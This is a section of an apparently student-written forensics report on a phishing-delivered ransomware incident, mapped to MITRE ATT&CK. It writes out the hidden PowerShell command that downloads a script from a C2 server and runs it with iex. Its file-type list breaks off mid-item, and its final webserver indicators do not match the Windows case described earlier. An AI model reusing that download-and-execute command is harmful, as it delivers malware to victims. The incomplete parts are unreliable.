\subsection{Digital Forensics}

\subsubsection{Target Machine Examination}
The group which apparently conducted  attack calls their ransomware \enquote{Gonnasmile} (see \cref{for_wallpaper}). They claim that the victim's files have been encrypted, and that they can find instructions to recover them in the text file placed on the Desktop.

The text file contains a ransom note that demands 500\$ to be sent to a cryptocurrency wallet (see \cref{ransom}). The files in the user's \textit{Documents} folder have a \textit{.encrypted} file ending, and are illegible (see \cref{document_encr_ex}). All documents render in the same manner (see Appendix, \cref{encr1,encr2}), displaying either placeholder or Chinese characters.
Trying different encodings to display the file contents didn't yield legible results, meaning the files were most likely actually cryptographically altered instead of having just their encodings changed, lending credence to the claim of encryption in the ransom note.

\subsubsection{Compromise Indicator Assessment}
Assessing the victim's E-Mail inbox reveals a Phishing E-Mail (see \cref{fish_mail}). The attackers used the \textit{Phishing: Spearphishing Link (T1566.002)} \autocite{mitre:attack:T1566:002} technique to target the victim.
They posed as Microsoft Support by using an E-Mail made to look similar to a real support account (see \cref{fish_mail_mail}), leading the user to fall victim to the \textit{Social Engineering: Email Spoofing (T1684.002)} technique \autocite{mitre:attack:T1684:002}. The E-Mail contained a hyperlink, which contained the attacker's C2-Server's address and the port the server ran on: \textit{IP:192.168.61.26, Port: 8080} (see \cref{fish_mail_c2}). 
The attackers created fake urgency by claiming the user's account had been compromised.

The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}). This can be categorized as \textit{Ingress Tool Transfer (T1105)} \autocite{mitre:attack:T1105}. The command then executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).

The computer the command ran on was called \textit{DESKTOP-FEA5EJA} (see \cref{fish_reste}, marked green).

The command had the timestamp \textit{January 13, 2025, at 17:28:40.321369200}. (see \cref{fish_reste}, marked cyan).

\subsubsection{Network Traffic Analysis}
The display filter (see \cref{shark_filter}) was chosen with the following reasoning based on the information collected prior \autocite{wireshark:disp}:
\begin{itemize}
\itemBF{http}
The attacker sent the payload via HTTP, so filtering for that protocol would limit the results to the packets using the same protocol the attacker employed.
\itemBF{ip.addr==192.168.61.26}
Filtering for packets originating from and addressed to the C2 server returned those packets the server sent and received during the incident.
\itemBF{tcp.port==8080}
The C2 server was known to be running on port 8080, therefore limiting the displayed traffic to packets addressed to that port would further narrow results down. 
\end{itemize}

	\centering

If this filter had still returned too many packers, the filter \textit{http.request.uri matches "download.txt"} could have been used to show just the packets containing the payload script. The filter limited the results enough to enable the relevant packet to be identified (see \cref{shark_load}).
Following the HTTP stream revealed the downloaded text file, containing the ransomware in form of a \textit{PowerShell} script.

The attacker uses a SimpleHTTP Python server, running on Python version 3.11.2 (see \cref{shark_serv}).
The script encrypts the following file types, while explicitly excluding packet capture (\textit{.pcap}) files (see \cref{shark_inc_ex}, marked red):
\begin{itemize}

\item{Microsoft Word files (\textit{.docx}}

\subsubsection{Attack Validation}
Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves (see \cref{captchga}). The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that the button's onClick-handler calls a function, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}). This can be categorized as \textit{User Execution: Malicious Copy and Paste (T1204.004)} \autocite{mitre:attack:T1204:004}.

The victim must have clicked the link, then clicked the fake \textit{Captcha} button, and followed the instructions in the popup. This led to their system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)} \autocite{mitre:attack:T1486}.

There are a few indicators that make this occurrence suspicious:
\begin{enumerate}
\itemBF{A webserver spawns a bash process}
This can happen naturally if the webserver needs to execute programs, but could raise red flags if it is not intended (see \cref{shell_spawn}).
\itemBF{The executed commands are suspicious}
Commands like \textit{whoami} should most likely not be run by a webserver, indicating an attacker has logged on (see \cref{whoami}).
\itemBF{Recorded reverse shell command}
A webserver should not establish an outbound connection via netcat (see \cref{nccommand}).
\end{enumerate}
